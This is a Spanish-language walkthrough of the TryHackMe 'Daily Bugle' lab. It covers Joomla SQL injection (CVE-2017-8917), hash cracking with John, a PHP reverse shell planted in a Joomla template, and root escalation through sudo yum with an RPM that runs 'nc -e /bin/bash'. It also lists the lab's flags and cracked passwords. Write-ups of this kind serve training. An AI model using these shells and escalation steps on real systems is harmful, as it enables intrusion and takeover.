# Daily Bugle

`Try Hack Me` `Linux` `CMS Joomla` `MySQL` `SQLi` `John` `CVE-2017-8917` `sudo` `yum` `fpm`

## Flags

* **User Flag:** `27a260fe3cba712cfdedb1c86d80442e`
* **Root Flag:** `eec3d53292b1821868266858d7fa6f79`

## Users

* jonah en Joomla _\(pwd: `spiderman123`\)_
* root en MySQL _\(pwd: `nv5uz9r3ZEDzVjNu`\)_
* jjameson _\(pwd: `nv5uz9r3ZEDzVjNu`\)_

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64
>
> Windows: TTL &gt;= 65 & &lt;= 128

![](https://i.imgur.com/5N1dmYi.png)

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 22 \(SSH\), 80 \(HTTP\) y 3306 \(MySQL\)

![](https://i.imgur.com/7KfgfYy.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80,3306 IP`

![](https://i.imgur.com/d0YcdH9.png)

Vemos que el HTTP tiene el robots.txt con entradas \(CMS Joomla\) y el MySQL es un MongoDB.

### Servicio HTTP

Lanzamos un whatweb para ver si tiene algún CMS tipo Wordpress: `whatweb IP`

![](https://i.imgur.com/EjeWfVz.png)

Vemos ya que se trata del **CMS Joomla**. Accedemos a la web y vemos lo mismo con Wappalyser

![](https://i.imgur.com/inBGySd.png)

Vamos a hacer un **fuzzing** en el portal para encontrar alguna ruta con **GoBuster**`gobuster dir -u IP -w DICT -q -n -e`

```text
-u        Target 
-w         Diccionario (/usr/share/wordlists/dirb/common.txt)
-q        Silencioso, no muestra mensajes de estado           
-n        No muestra códigos de estado        
-e        Muestra URLs completas
```

![](https://i.imgur.com/ASWEHHs.png)

## Joomla CMS

Tenemos algunos paths que pueden ser interesantes. Probamos a acceder a todos, pero solo tenemos acceso o solo hay info en **`/administrator`**, que es un portal de login.

![](https://i.imgur.com/ghvZMDD.png)

Lanzamos un script de enumeración de joomla: **`joomscan -u httP://IP`**

{% embed url="https://tools.kali.org/web-applications/joomscan" caption="" %}

Con este, detectamos la versión de Joomla: **`3.7.0`**

![](https://i.imgur.com/xc27RvW.png)

### SQLi

El script nos da algo de información pero no encuentra vulnerabilidades. Procedemos a buscar exploits para la versión de Joomla detectada.

![](https://i.imgur.com/JDQ8Bjm.png)

Encontramos un exploit de SQL Injection sobre el módulo com\_fields. \(CVE-2017-8917\)

{% embed url="https://www.exploit-db.com/exploits/44227" caption="" %}

Lo descargamos. Observamos el código y vemos que es PHP, con lo que no podemos ejecutarlo. Levantamos un servidor en PHP para cargarlo vía web, con:

```text
php -S localhost:8000
```

Lo abrimos en la web con **`http://localhost:8000`** e introducimos la IP target de la máquina. A los pocos segundos tenemos un usuario y una password hasheada.

![](https://i.imgur.com/VJcQgCi.png)

{% hint style="warning" %}
Tenemos un usuario **`Jonah`** y su password hasheada **`$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`**
{% endhint %}

> Guardamos para más tarde el hacer la SQLi manualmente

### John

Tenemos un hash, que hay que crackear. Para ello, usamos **`john`**. Primero, copiamos el hash encontrado en un fichero. Luego ejecutamos:

```text
/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Tras un tiempo \(~15 minutos\), obtenemos la password

![](https://i.imgur.com/gbAFr9T.png)

{% hint style="warning" %}
Tenemos la password de **jonah**: **`spiderman123`**
{% endhint %}

Tenemos ya un usuario/password, pero no sirven para SSH. Con las credenciales conseguimos entrar en Joomla.

### Joomla RCE

Como siempre con un CMS, intentamos habilitar un RCE modificando los ficheros PHP de las plantillas.

![](https://i.imgur.com/sS1stO1.png)

Accedemos al panel de **Templates**, abrimos la default \(protostar\) y añadimos un "hola mundo" en el **`index.php`** para comprobar que funciona.

![](https://i.imgur.com/8v96zLI.png)

Probamos luego con un RCE sencillo, un **`whoami`**:

![](https://i.imgur.com/bRp7tYZ.png)

Vemos que si que funciona.

## **Getting a shell**

Llegados a este punto, tenemos que insertar en la template un código que levante una Shell reversa. Añadimos al principio del fichero **index.php** el siguiente código:

```text
<?php
    $ip="IP";
    $port=PORT;
    echo "Getting reverse shell on $ip:$port";
    $sock = fsockopen($ip,$port);
    $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

![](https://i.imgur.com/aeaI5Vf.png)

Lo guardamos y recargamos la página principal:

![](https://i.imgur.com/UYcoo4T.png)

Hemos conseguido acceso a la máquina.

{% hint style="danger" %}
Podemos configurar una shell interactiva con

```bash
script /dev/null -c bash 
# CTRL + Z
stty raw -echo
fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows *NumRows* columns *NumCols*

# En una terminal de nuestra máquina, para sacar NumRows y NumCols
stty -a
```
{% endhint %}

### **User Flag**

No encontramos la flag en el directorio, pero vemos un fichero **`configuration.php`**, donde vemos una password de root para MySQL:

![](https://i.imgur.com/kWmft9X.png)

{% hint style="warning" %}
Tenemos la password de **root** en MySQL: **`nv5uz9r3ZEDzVjNu`**
{% endhint %}

En el directorio **`/home`** vemos un usuario **`jjameson`**.

![](https://i.imgur.com/dyfTfdL.png)

Probamos para este usuario tanto la password de Joomla como la de MySQL. Con la segunda vemos que funciona.

![](https://i.imgur.com/4C3pgVN.png)

{% hint style="warning" %}
Tenemos la password de **jjameson**: **`nv5uz9r3ZEDzVjNu`**
{% endhint %}

En su directorio podemos ver la flag.

{% hint style="success" %}
USER FLAG: **`27a260fe3cba712cfdedb1c86d80442e`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

También podemos lanzar este [script ](https://github.com/rebootuser/LinEnum)para enumerar el sistema:

{% file src="../../.gitbook/assets/linenum.sh" caption="Linux Enumeration Script" %}

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario jjameson con el comando `sudo -l`.

![](https://i.imgur.com/BLtjFhI.png)

Vemos que puede ejecutar **`/usr/bin/yum`** con sudo sin contraseña. Buscamos en GTOBINS y encontramos un posible ataque:

{% embed url="https://gtfobins.github.io/gtfobins/yum/\#sudo" caption="" %}

![](https://i.imgur.com/xx2sIPq.png)

### YUM & FPM

En primer lugar, debemos utilizar el comando **`fpm`**, que permite crear RPM sencillos con los comandos indicados.

{% embed url="https://github.com/jordansissel/fpm" caption="" %}

Generamos un RPM con el comando **`id`**, lo copiamos en la máquina y lo instalamos con **`sudo /usr/bin/yum localinstall -y privesc.rpm`**.

![](https://i.imgur.com/4QJpEMv.png)

Vemos que funciona y nos muestra el resultado del comando **`id`**.

![](https://i.imgur.com/q80x0xM.png)

Volvemos a generar un nuevo RPM \(versión 2, para que al instalar el RPM actualice\) con los siguientes comandos, para ejecutar una shell reversa:

```text
echo 'nc -e /bin/bash IP PORT' > $TF/x.sh
fpm -n x -s dir -t rpm -a all -v 2.0.0 --before-install $TF/x.sh $TF
```

Lo volvemos a copiar e instalar y conseguimos una shell como root.

![](https://i.imgur.com/8THFMlV.png)

### **Root Flag**

Hemos escalado privilegios. Vamos al directorio **`/root`** a por la **root.txt** flag.

{% hint style="success" %}
ROOT FLAG: **`eec3d53292b1821868266858d7fa6f79`**
{% endhint %}

